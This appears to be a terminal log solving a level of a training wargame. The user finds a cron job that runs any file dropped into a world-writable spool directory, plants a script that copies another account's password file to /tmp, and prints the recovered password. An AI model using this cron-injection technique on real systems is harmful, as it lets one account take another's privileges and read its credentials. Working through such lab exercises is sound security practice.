bandit23@bandit:~$ ls /etc/cron.d
# atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
# @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
# myname=$(whoami)
# cd /var/spool/$myname
# echo "Executing and deleting all scripts in /var/spool/$myname:"
# for i in * .*;
# do
#     if [ "$i" != "." -a "$i" != ".." ];
#     then
#         echo "Handling $i"
#         timeout -s 9 60 ./$i
#         rm -f ./$i
#     fi
# done


bandit23@bandit:~$ ls -al /var/spool
# total 1348
# drwxr-xr-x  5 root root        4096 Oct 16  2018 .
# drwxr-xr-x 11 root root        4096 Oct 16  2018 ..
# drwxrwx-wx 35 root bandit24 1359872 Mar 27 09:04 bandit24
# drwxr-xr-x  3 root root        4096 Oct 16  2018 cron
# lrwxrwxrwx  1 root root           7 Oct 16  2018 mail -> ../mail
# drwx------  2 root root        4096 Jan 14  2018 rsyslog

bandit23@bandit:~$ nano /var/spool/bandit24/password_script.sh
#!/bin/bash
# cat /etc/bandit_pass/bandit24 > /tmp/mohammad

bandit23@bandit:~$ chmod 777 /var/spool/bandit24/password_script.sh

bandit23@bandit:~$ cat /tmp/mohammad
# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ